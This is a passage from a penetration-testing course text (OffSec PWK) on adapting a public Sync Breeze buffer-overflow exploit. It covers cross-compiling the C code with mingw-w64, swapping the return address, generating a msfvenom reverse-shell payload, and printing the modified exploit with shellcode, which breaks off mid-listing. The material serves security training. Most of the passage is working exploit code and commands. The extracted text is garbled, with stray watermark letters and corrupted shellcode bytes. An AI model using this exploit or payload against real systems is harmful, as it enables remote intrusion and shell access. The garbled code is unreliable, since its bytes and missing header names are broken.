#include 
#include 
Listing 315 - Displaying the C headers at the beginning of the exploit code
687 (PyInstaller, 2022) https://www.pyinstaller.org
688 (OffSec, 2023), https://www.exploit-db.com/exploits/42341/
689 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/windows/desktop/ms737629(v=vs.85).aspx
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 434
Made in Morocco
Penetration Testing with Kali Linux
Although we could attempt to compile this on Windows, we will instead cross-compile690 this
exploit using Kali.
14.1.3 Cross-Compiling Exploit Code
To avoid compilation issues, it is generally recommended to use native compilers for the specific
operating system targeted by the code; however, this may not always be an option.
In some scenarios, we might only have access to a single attack environment (like Kali), but need
to leverage an exploit coded for a different platform. In such cases, a cross-compiler can be
extremely helpful.
We will use the extremely popular mingw-w64 cross-compiler in this section. If it’s not already
present, we can install it using apt.
y
kali@kali:~$ sudo apt install mingw-w64
Listing 316 - Installing the mingw-w64 cross-compiler in Kali
k
We can use mingw-w64 to compile the code into a Windows Portable Executable (PE)691 file. The
first step is to determine if the exploit code compiles without errors. We can do this by invoking
s
the cross-compiler, passing the C source file as the first argument and the output PE file name as
the second argument, prepended by the -o parameter.
o
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined
reference to `_imp__WSAStartup@8' n
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xa5): undefined
reference to `_imp__WSAGetLastError@0'
i
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xe9): undefined
reference to `_imp__socket@12'z
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xfc): undefined
reference to `_imp__WSAGetLastError@0'
D
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x126): undefined
reference to `_imp__inet_addr@4'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x146): undefined
reference to `_imp__htons@4'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x16f): undefined
reference to `_imp__connect@12'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x1b8): undefined
reference to `_imp__send@16'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x1eb): undefined
reference to `_imp__closesocket@4'
collect2: error: ld returned 1 exit status
Listing 317 - Errors displayed after attempting to compile the exploit using mingw-64
Something went wrong during the compilation process and although the errors from Listing 317
may be unfamiliar, a simple Google search for the first error related to “WSAStartup” reveals that
this is a function found in winsock.h. Further research indicates that these errors occur when the
linker cannot find the winsock library, and that adding the -lws2_32 parameter to the i686-w64-
mingw32-gcc command should fix the problem.
690 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Cross_compiler
691 (OffSec, 2023), https://forums.offensive-security.com/showthread.php?t=2206&p=8529
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 435
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
kali@kali:~$ ls -lah
total 372K
drwxr-xr-x 2 root root 4.0K Feb 24 17:13 .
drwxr-xr-x 17 root root 4.0K Feb 24 15:42 ..
-rw-r--r-- 1 root root 4.7K Feb 24 15:46 42341.c
-rwxr-xr-x 1 root root 355K Feb 24 17:13 syncbreeze_exploit.exe
Listing 318 - Successfully compiling the code after adjusting the mingw-w64 command to link the winsock library
This time, mingw32 produced an executable without generating any compilation errors. With the -
l option, we can instruct mingw-w64 to search for the ws2_32 DLL and include it in the final
executable via static linking.
We already know that this exploit targets a remotely-accessible vulnerability, which means that
our code needs to establish a connection to the target at some pointy.
Inspecting the C code, we’ll notice that it uses hard-coded values for the IP address and port
k
fields:
printf("[>] Socket created.\n"); s
server.sin_addr.s_addr = inet_addr("10.11.0.22");
server.sin_family = AF_INET;
o
server.sin_port = htons(80);
Listing 319 - Identifying the code lines responsible for the IP address and port
n
These will be the first values that we’ll need to adjust in our exploit.
14.1.4 Fixing the Exploit
i
z
Let’s more closely review the C code. Further inspection reveals the use of a return address
located in the Visual Basic 6.0 runtime msvbvm60.dll, which is not part of the vulnerable software.
Examining the loaded moduDles in the debugger on our Windows client, we notice that this DLL is
absent, meaning that the return address will not be valid for our target.
To verify this, we’ll first need to start the Sync Breeze Service on the Windows 10 client. Next, we
can launch Immunity Debugger as administrator, click on File > Attach, and select the syncbrs
process. Once attached, we’ll click on the View menu, then Executable modules. From there, we
can verify that msvbvm60.dll is not present by checking the Name and Path values.
Given that the Python version692 of the exploit is marked as EDB Verified and thus, been already
proven to be working, we can replace the target return address with the one contained in that
version:
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
Listing 320 - Changing the return address
If we do not have a return address from a previously-developed exploit, we have a few options to
consider. The first, and most recommended option, is to recreate the target environment locally
and use a debugger to determine this address.
692 (OffSec, 2023), https://www.exploit-db.com/exploits/42928
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 436
Made in Morocco
Penetration Testing with Kali Linux
If this is not an option, we could use information from other publicly-available exploits to find a
reliable return address that will match our target environment. For example, if we needed a return
address for a JMP ESP instruction on Windows Server 2019, we could search for it in public
exploits leveraging different vulnerabilities targeting that operating system. This method is less
reliable and can vary widely depending on the protections installed on the operating system.
During a “vanilla” buffer overflow, we should not rely on hard-coded JMP ESP addresses coming
from system DLLs, since these are all randomized at boot time due to ASLR. Instead, we should
try to find these instructions in non-ASLR modules inside the vulnerable application whenever
possible.
We could also obtain a return address directly from the target machine. If we have access to our
target as an unprivileged user and want to run an exploit that will elevate our privileges, we can
copy the DLLs that we are interested in onto our attack machine. We can then leverage various
tools, such as disassemblers like objdump,693 which is installed by deyfault on Kali.
Continuing our analysis of this C exploit, we’ll notice that the shellcode variable seems to hold the
k
payload. Since it is stored as hex bytes, we cannot easily determine its purpose. The only hint
given by the author refers to a NOP slide that is part of the shellcode variable:
s
unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
o
"\xdb\xda\xbd\x92\xbc\xaf\xa7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x17\x83\xc0\x04\x03\xfa\xaf\x4d\x52\x06\x27\x13"
"\x9d\xf6\xb8\x74\x17\x13\x89\xb4\x43\x50\xba\x04\x07\x34\x37"
n
"\xee\x45\xac\xcc\x82\x41\xc3\x65\x28\xb4\xea\x76\x01\x84\x6d"
"\xf5\x58\xd9\x4d\xc4\x92\x2c\x8c\x01\xce\xdd\xdc\xda\x84\x70"
"\xf0\x6f\xd0\x48\x7b\x23\xf4\xc8\x98\xf4\xf7\xf9\x0f\x8e\xa1"
i
"\xd9\xae\x43\xda\x53\xa8\x80\xe7\x2a\x43\x72\x93\xac\x85\x4a"
z
"\x5c\x02\xe8\x62\xaf\x5a\x2d\x44\x50\x29\x47\xb6\xed\x2a\x9c"
"\xc4\x29\xbe\x06\x6e\xb9\x18\xe2\x8e\x6e\xfe\x61\x9c\xdb\x74"
"\x2d\x81\xda\x59\x46\xDbd\x57\x5c\x88\x37\x23\x7b\x0c\x13\xf7"
"\xe2\x15\xf9\x56\x1a\x45\xa2\x07\xbe\x0e\x4f\x53\xb3\x4d\x18"
"\x90\xfe\x6d\xd8\xbe\x89\x1e\xea\x61\x22\x88\x46\xe9\xec\x4f"
"\xa8\xc0\x49\xdf\x57\xeb\xa9\xf6\x93\xbf\xf9\x60\x35\xc0\x91"
"\x70\xba\x15\x35\x20\x14\xc6\xf6\x90\xd4\xb6\x9e\xfa\xda\xe9"
"\xbf\x05\x31\x82\x2a\xfc\xd2\x01\xba\x8a\xef\x32\xb9\x72\xe1"
"\x9e\x34\x94\x6b\x0f\x11\x0f\x04\xb6\x38\xdb\xb5\x37\x97\xa6"
"\xf6\xbc\x14\x57\xb8\x34\x50\x4b\x2d\xb5\x2f\x31\xf8\xca\x85"
"\x5d\x66\x58\x42\x9d\xe1\x41\xdd\xca\xa6\xb4\x14\x9e\x5a\xee"
"\x8e\xbc\xa6\x76\xe8\x04\x7d\x4b\xf7\x85\xf0\xf7\xd3\x95\xcc"
"\xf8\x5f\xc1\x80\xae\x09\xbf\x66\x19\xf8\x69\x31\xf6\x52\xfd"
"\xc4\x34\x65\x7b\xc9\x10\x13\x63\x78\xcd\x62\x9c\xb5\x99\x62"
"\xe5\xab\x39\x8c\x3c\x68\x59\x6f\x94\x85\xf2\x36\x7d\x24\x9f"
"\xc8\xa8\x6b\xa6\x4a\x58\x14\x5d\x52\x29\x11\x19\xd4\xc2\x6b"
"\x32\xb1\xe4\xd8\x33\x90";
Listing 321 - The shellcode variable content includes a NOP slide before the actual payload
Since bad characters are already listed in the Python exploit, we can generate our own payload
with msfvenom, remembering to target the x86 platform and format it for C code:
693 (Michael Kerrisk, 2022) https://man7.org/linux/man-pages/man1/objdump.1.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 437
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443
EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
...
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] =
"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
"\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
"\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
"\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
"\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
"\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xbay"
"\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
"\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
k
"\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
"\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
"\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
s
"\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
"\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
"\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37o\x8f\x46\x4d\x36"
"\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
"\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
"\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\xn7f\x40\x9a\xa5\x6d\xfb"
"\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
"\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
"\x8d\x2f\xdb\x5e\x92\x65\xad\xbie\x23\xd0\xe8\xc1\x8c\xb4\xfc"
"\xba\xf0\x24\x02\x11\xb1\x45\zxe1\xb3\xcc\xed\xbc\x56\x6d\x70"
"\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
"\x27\x0f\xbf\x91\x48\x1a";
D
Listing 322 - Using msfvenom to generate a reverse shell payload that fits our environment
After completing the above-mentioned changes, our exploit code now appears as so:
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512
#include 
#include 
#include 
#include 
DWORD SendRequest(char *request, int request_size) {
WSADATA wsa;
SOCKET s;
struct sockaddr_in server;
char recvbuf[DEFAULT_BUFLEN];
int recvbuflen = DEFAULT_BUFLEN;
int iResult;
printf("\n[>] Initialising Winsock...\n");
if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
{
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 438
Made in Morocco
Penetration Testing with Kali Linux
printf("[!] Failed. Error Code : %d", WSAGetLastError());
return 1;
}
printf("[>] Initialised.\n");
if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
{
printf("[!] Could not create socket : %d", WSAGetLastError());
}
printf("[>] Socket created.\n");
server.sin_addr.s_addr = inet_addr("192.168.50.120");
server.sin_family = AF_INET;
server.sin_port = htons(80);
if (connect(s, (struct sockaddr *)&server, sizeof(server)y) ] Connected");
s
if (send(s, request, request_size, 0) ] Request sent\n");
closesocket(s);
return 0; i
} z
void EvilRequest() {
D
char request_one[] = "POST /login HTTP/1.1\r\n"
"Host: 192.168.50.120\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0)
Gecko/20100101 Firefox/52.0\r\n"
"Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.50.120/login\r\n"
"Connection: close\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Content-Length: ";
char request_two[] = "\r\n\r\nusername=";
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 439
Made in Morocco
Penetration Testing with Kali Linux
"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
"\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"
"\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
"\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
"\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
"\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
"\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
"\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
"\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
"\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
"\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
"\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
"\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
"\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
"\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\yx7b"
"\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
"\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
"\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5k\x70\x87"
"\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
"\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
s
"\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
"\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
"\x27\x0f\xbf\x91\x48\x1a"; o
char request_three[] = "&password=A";
n